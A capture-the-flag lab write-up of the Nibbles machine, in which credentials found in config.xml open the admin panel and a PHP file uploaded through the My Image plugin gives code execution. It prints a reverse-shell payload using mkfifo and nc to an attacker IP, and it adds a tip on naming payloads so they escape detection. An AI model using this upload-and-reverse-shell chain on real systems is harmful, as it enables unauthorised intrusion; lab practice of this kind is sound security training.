# Nibbles Web Footprinting

By using curl, we discover a hidden directory located at /nibbleblog.

<img width="490" height="295" alt="image" src="https://github.com/user-attachments/assets/de9bcd7f-022b-469a-9c05-6e6a94ffd23f" />

During initial reconnaissance, we discovered a config.xml file containing valuable configuration details.

<img width="1006" height="688" alt="image" src="https://github.com/user-attachments/assets/6d8905ac-eb64-409d-ac93-7d799dc4a718" />

Using Gobuster, we discovered an admin login page located at admin.php
"Using the credentials admin:Nibbles obtained from the XML file, we successfully logged into the admin.php login page.

<img width="870" height="816" alt="image" src="https://github.com/user-attachments/assets/24438602-bb27-463f-bc48-d708694f7c1f" />

After logging in, we navigated to the 'Plugins' section and selected 'My Image', then clicked on 'Configure'.

<img width="1219" height="482" alt="image" src="https://github.com/user-attachments/assets/d9e10309-59cc-4b57-a17d-870b9d9bfafc" />


<?php system('id'); ?>  ---> our image.php file.

<img width="521" height="234" alt="image" src="https://github.com/user-attachments/assets/e8169942-3a84-4d30-a616-1e760b4a20ba" />

We confirmed that our PHP file was successfully uploaded, indicating that the application may allow us to upload a reverse shell.

<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 9443 >/tmp/f"); ?>   --> payload.php  

Tip: Avoid naming payloads with obvious or suspicious names such as 'virus' or 'payload', as they are more likely to be detected and flagged in real-world environments.

We started a Netcat listener and executed the payload either by using curl or by directly accessing the file via the browser from the my_image directory.And we are in!

<img width="957" height="23" alt="image" src="https://github.com/user-attachments/assets/5a69d82f-b98f-4d8b-8c0a-25b44fe043ce" />

<img width="749" height="141" alt="image" src="https://github.com/user-attachments/assets/0db0068e-d8a6-450a-aed8-6793b03715b3" />

"After obtaining a shell, we retrieved the flag and proceeded with privilege escalation in the subsequent lab.

<img width="1025" height="609" alt="image" src="https://github.com/user-attachments/assets/6032f880-971d-4fce-9c42-6b06dad7b007" />
